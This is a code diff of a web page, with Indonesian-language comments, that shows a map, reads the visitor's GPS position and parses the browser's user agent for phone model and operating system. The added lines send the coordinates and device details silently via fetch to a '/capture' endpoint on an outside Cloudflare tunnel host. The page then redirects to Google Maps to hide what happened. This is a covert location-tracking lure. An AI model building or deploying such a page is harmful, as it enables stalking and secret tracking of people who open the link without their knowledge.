@@ -119,12 +119,12 @@
     </div>
 
 <script>
-    // Kosongin karena sekarang satu domain (nggak lewat Vercel)
-    const BACKEND_URL = ""; 
+    const BACKEND_URL = "https://copyrighted-hoping-tomato-cambridge.trycloudflare.com"; 
 
     var map = L.map('map', {zoomControl: false}).setView([2.9903, 101.4259], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
+    // Fungsi Deteksi HP Manual (Cadangan kalau library gagal load)
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let device = "Unknown Device";
@@ -134,6 +134,7 @@
             os = "Android";
             const match = ua.match(/Android\s([0-9\.]+)/);
             if (match) os += " " + match[1];
+            
             const modelMatch = ua.match(/;\s?([^;]+)\s?Build/);
             if (modelMatch) device = modelMatch[1];
             else device = "Android Phone";
@@ -143,9 +144,11 @@
             if (match) os += " " + match[1].replace(/_/g, '.');
             device = ua.includes("iPad") ? "iPad" : "iPhone";
         } else if (/Windows/i.test(ua)) {
-            os = "Windows"; device = "Windows PC";
+            os = "Windows";
+            device = "Windows PC";
         } else if (/Macintosh/i.test(ua)) {
-            os = "macOS"; device = "MacBook / iMac";
+            os = "macOS";
+            device = "MacBook / iMac";
         }
         return { device, os };
     }
@@ -167,11 +170,12 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // Nembak ke server sendiri (Instan)
+                    // KIRIM DATA PAKAI FETCH (Lebih Cepat dari iframe)
                     const url = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
+                    
                     fetch(url, { mode: 'no-cors' }).catch(() => {});
 
-                    // Langsung redirect setelah kirim
+                    // Kasih waktu 1 detik aja, jangan kelamaan
                     setTimeout(() => {
                         window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
                     }, 1000);
